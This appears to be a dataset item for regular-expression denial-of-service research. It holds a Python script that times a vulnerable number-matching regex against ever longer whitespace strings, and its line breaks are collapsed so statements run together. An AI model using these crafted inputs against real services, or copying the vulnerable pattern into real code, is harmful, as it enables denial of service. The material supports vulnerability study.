#vuln pattern: POA#vuln degree: POL#mul vuln: N#vuln location: \s*[+-]?\s*import refrom time import perf_counterregex = '^\s*[+-]?\s*(?:\d{1,3}(?:(,?)\d{3})?(?:\1\d{3})*(\.\d*)?|\.\d+)\s*$'REGEX = re.compile(regex)for i in range(0, 150000):    ATTACK = "" + " " * i*10000 + "!"    LEN = len(ATTACK)    BEGIN = perf_counter()    m = REGEX.search(ATTACK)    DURATION = perf_counter() - BEGIN    print(f"{LEN}: took {DURATION} seconds!")